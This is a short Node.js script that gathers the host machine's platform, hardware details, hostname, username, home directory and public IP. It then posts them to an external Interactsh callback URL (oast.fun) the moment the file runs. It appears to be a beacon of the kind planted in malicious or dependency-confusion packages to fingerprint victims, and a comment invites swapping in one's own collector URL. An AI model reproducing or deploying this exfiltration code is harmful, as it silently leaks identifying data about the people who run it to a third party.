const os = require('os');        // Module to get OS details
const axios = require('axios');   // Module to make HTTP requests

// Function to get user and system details
const getUserAndSystemDetails = () => {
    const systemDetails = {
        platform: os.platform(),             // OS platform
        architecture: os.arch(),             // System architecture
        cpuCores: os.cpus().length,          // Number of CPU cores
        freeMemory: os.freemem(),            // Free memory in bytes
        totalMemory: os.totalmem(),          // Total memory in bytes
        hostname: os.hostname(),             // Hostname
        username: os.userInfo().username,    // Current user
        homeDir: os.userInfo().homedir       // User's home directory
    };
    return systemDetails;
};

// Function to get public IP address
const getPublicIp = async () => {
    try {
        const response = await axios.get('https://api64.ipify.org?format=json'); // Fetch public IP
        return response.data.ip;
    } catch (error) {
        console.error('Error fetching public IP:', error);
        return null;
    }
};

// Function to send data to the Intercct SH instance
const sendToIntercctSH = async (data) => {
    try {
        const intercctUrl = 'https://zezcpprclerkqyeittfxklacg53safnqu.oast.fun'; // Replace with your Intercct SH instance URL
        const response = await axios.post(intercctUrl, data, {
            headers: { 'Content-Type': 'application/json' }
        });
        console.log('Data sent successfully:', response.data);
    } catch (error) {
        console.error('Error sending data:', error);
    }
};

// Main function to fetch details and send them
const main = async () => {
    const systemDetails = getUserAndSystemDetails();
    const publicIp = await getPublicIp();
    const data = {
        ...systemDetails,
        ip: publicIp
    };

    console.log('Sending the following data to Intercct SH:', data);
    await sendToIntercctSH(data);
};

// Execute the main function
main();
